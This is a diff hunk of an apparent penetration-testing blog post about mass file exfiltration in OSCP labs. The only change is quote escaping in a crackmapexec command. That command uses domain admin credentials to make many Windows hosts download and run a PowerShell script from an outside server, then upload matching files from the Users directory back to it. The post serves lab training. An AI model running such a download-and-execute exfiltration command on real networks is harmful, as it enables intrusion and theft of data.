@@ -181,7 +181,7 @@ This blog talks about mass exfiltration so we will assume you are like me and ju
 We will use crackmapexec to source the upload.ps1 from our server and run it. This command is looking for the proofs but in the OSCP labs i use this as an initial peek into the Users directory on Windows boxes becasue from my experience offsec likes to put the juicy there or the root of the drive.
 
 ```shell
-crackmapexec smb $(cat nodes.txt) -u DomainAdminUser -p DAPassword -x 'powershell.exe -command "iex (iwr http://192.168.45.242:8443/tools/upload.ps1 -usebasicparsing);exfil -dir c:\users\ -recurse -include '*local.txt,*proof.txt' -url http://192.168.45.242:8443 "'
+crackmapexec smb $(cat nodes.txt) -u DomainAdminUser -p DAPassword -x 'powershell.exe -command "iex (iwr http://192.168.45.242:8443/tools/upload.ps1 -usebasicparsing);exfil -dir c:\users\ -recurse -include ""*local.txt,*proof.txt"" -url http://192.168.45.242:8443 "'
 ```
 <b>LOOT!!!</b>
 ![Loot Flows In](/_posts/res/PostServer.png?raw=true)
